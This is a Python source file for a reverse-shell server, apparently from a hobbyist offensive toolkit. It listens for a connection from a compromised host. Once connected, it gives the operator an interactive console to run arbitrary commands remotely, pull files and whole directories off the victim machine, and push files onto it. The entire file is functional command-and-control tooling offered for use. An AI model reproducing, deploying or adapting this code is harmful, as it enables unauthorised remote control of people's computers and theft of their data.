#!/usr/bin/env python
# Created by ybenel
# Updated in 2022/12/10
# A Reverseshell server

import os
import socket
import struct
import sys
from datetime import datetime
try:
  input = raw_input
except NameError:
  input = input

# pylint: disable=invalid-name, multiple-statements

# Colors
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
reset = "\033[0m"
blue = "\033[1;34m"
purple = "\033[1;35m"

class send_res:
  def __init__(self, sock):
    self.sock = sock

  def send(self, data):
    """ Bulk Send Commands And Data """
    data = struct.pack('>I', len(data)) + data
    self.sock.sendall(data)

  def recv(self):
    """ Receive First Letter, Then Return the rest """
    data = self.recvall(4)
    if not data:
      return ""
    data = struct.unpack('>I', data)[0]
    return self.recvall(data)

  def recvall(self, n):
    """ Bulk Receive Data, Including Files and Whatnot """
    packet = b''
    while len(packet) < n:
      frame = self.sock.recv(n - len(packet))
      if not frame:
        return None
      packet += frame
    return packet

class server:
  def __init__(self, res_send):
    self.res_send = res_send

  def server(self, ip, port):
    """ Server To Handle Connection """
    global soc, a, b, controller
    res_send = self.res_send
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)
    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
    soc.bind((ip, port))
    soc.listen(1)
    print(yellow + "[+] Server Started On {}:{} < at [{}]".format(ip, port, datetime.now().strftime("%H:%M:%S")) + reset)
    try:
      b, a = soc.accept()
      controller = res_send(b)
      self.control()
    except (KeyboardInterrupt, EOFError):
      print("Keyboard Interruption")
      sys.exit(1)
    except Exception as e:
      print("Exception err: %s" %(e))
      sys.exit(1)

  def save_file(self,down, file, dirc=None):
    """ Save file or files Incase of Directory """
    if dirc is not None:
      file = os.path.join(dirc,file)
    if down == "true":
      print(green + f"[+] Downloading [ {file} ]...." + reset)
      wf = open(file, "wb")
      while True:
        data = controller.recv()
        if data == b"done": break
        elif data == b"aborted":
          wf.close()
          os.remove(file)
          print(red + "[!] Download Has Been Aborted By Client!" + reset)
          return
        wf.write(data)
      wf.close()
      print(purple + "[+] Download Completed!\n[+] File Saved In {}\n".format(os.getcwd()+os.sep+file) + reset)
    else: print(down)

  def download(self, file):
    """ Download A file or a directory """
    cmd = file
    file = "".join(file.split("download")).strip()
    if file.strip():
      filedownload = file.split("/")[-1] if "/" in file else file.split("\\")[-1] if "\\" in file else file
      controller.send(cmd.encode("UTF-8"))
      down = controller.recv().decode('UTF-8','ignore')
      if down.startswith("dir:"):
        print("Downloading a directory %s" %(filedownload))
        length = struct.unpack('>I', controller.recv())[0]
        try:
          os.mkdir(filedownload)
        except Exception as e:
          print(f"Error {e}")
          sys.exit(1)
        for _ in range(0,length):
          file_down = controller.recv().decode('UTF-8','ignore')
          down = controller.recv().decode('UTF-8','ignore')
          self.save_file(down,file_down,filedownload)
      elif "No such file" in down:
        print("Error " + down)
      else:
        self.save_file(down,file)
    else: print(yellow + "Usage: download <file_to_download> " + reset)

  def file_send(self,file):
    controller.send(b"true")
    print("controller send true..")
    with open(file,"rb") as file_u:
      print("opening file ...")
      for data in iter(lambda: file_u.read(4100), b""):
        try:
          controller.send(data)
        except Exception as e:
          file_u.close()
          controller.send(b"aborted")
          print(red + "Uploading Has been aborted by User!\n" + reset)
          print(red + f"Error Caused The Error {e}")
    controller.send(b"done")

  def upload(self, file):
    """ Upload a file or a directory """
    fileupload = "".join(file.split("upload")).strip()
    if not fileupload.strip():
      print(yellow + "Usage: upload <file_to_upload> "+ reset)
    else:
      types = os.path.exists(fileupload)
      if not types:
        print(red + "Error: No Such File Or Directory: "+ fileupload+"\n"+reset)
      else:
        if os.path.isdir(fileupload):
          controller.send(file.encode('UTF-8') + b"dir:")
          files = os.listdir(fileupload)
          controller.send(struct.pack('>I', len(files)))
          msg = controller.recv().decode('utf-8')
          if not "Continue" in msg:
            print(red + msg + reset); proces = input("Processed y/n: ")
            if proces in ["n","N"]: return
          for d,e,f in os.walk(fileupload):
            for filem in f:
              print(cyan + "[+] Uploading [ {} ]...".format(filem) + reset)
              controller.send(filem.encode('UTF-8'))
              self.file_send(os.path.join(d,filem))
        else:
          self.file_send(fileupload)
        savedpath = controller.recv().decode('UTF-8')
        print(cyan + "Upload Completed\n[+] File Uploaded in : "+str(savedpath).strip()+" in client machine\n"+ reset)

  def help(self):
    """ Help Menu """
    print(green + """
    | ------------------ | -----------------------------------------|
    |      Commands      |                Description               |
    | ------------------ | -----------------------------------------|
    |       help         | Display help menu                        |
    |       kill         | Kill connection with client              |
    |       download     | Download file/directory from client      |
    |       upload       | Upload file/directory to client          |
    |       !exec        | Execute a local command                  |
    |       pwd          | Show current directory                   |
    |       cd           | Browse to a directory                    |
    |       cd -         | Browse to previous directory             |
    |       cd --        | Browse to root directory                 |
    | ------------------ | -----------------------------------------|
    """ + reset)

  def control(self):
    """ Handles Controlles And Commands And Whatnot """
    try:
      cmd = str(input("[{}]:~# ".format(a[0])))
      while not cmd.strip():
        cmd = str(input("[{}]:~# ".format(a[0])))
      if cmd == "help" or cmd == "menu":
        self.help()
        self.control()
      elif cmd.startswith("download"):
        self.download(cmd)
        self.control()
      elif cmd.startswith("upload"):
        self.upload(cmd)
        self.control()
      # elif cmd == "linpe":
      #   self.linpe()
      elif cmd == "kill":
        print(red + "[!] Connection Has Been Killed!" + reset)
        controller.send(b'kill')
        b.shutdown(2)
        b.close()
        soc.close()
        sys.exit(1)
      elif cmd.startswith("!exec"):
        cmd = "".join(cmd.split('exec')).strip()
        if not cmd.strip():
          print(blue + "Usage: exec <command> \n" + reset)
        else:
          os.system(cmd)
        self.control()
      elif cmd.lower() == "cls" or cmd == "clear":
        os.system("cls||clear")
        self.control()
      else:
        controller.send(cmd.encode('utf-8'))
        datta = controller.recv().decode('utf-8', 'ignore')
        if datta.strip():
          print(datta)
          if "Command Timeout occured" in datta:
            y = input(green + "[?]" + reset + " Terminate command [Y/n]: ")
            controller.send(y.encode('UTF-8'))
            print(controller.recv().decode('UTF-8'))
        self.control()
    except (KeyboardInterrupt, EOFError):
      print(" ")
      self.control()
    except socket.error as e:
      print(red + "[!] Connection Lost To: " + a[0] + "! \n" + reset)
      print(red + f"Error Cause By {e}" + reset)
      b.close()
      soc.close()
      sys.exit(1)
    except UnicodeEncodeError:
      print(datta)
      print(" ")
      self.control()
    except Exception as e:
      print(red + f"[!] An Error Occurred: {e} \n" + reset)
      self.control()

if len(sys.argv) != 3:
  print(white + "Usage: python server.py <ip> <port>" + reset)
  sys.exit(1)

server = server(send_res)
server.server(sys.argv[1], int(sys.argv[2]))
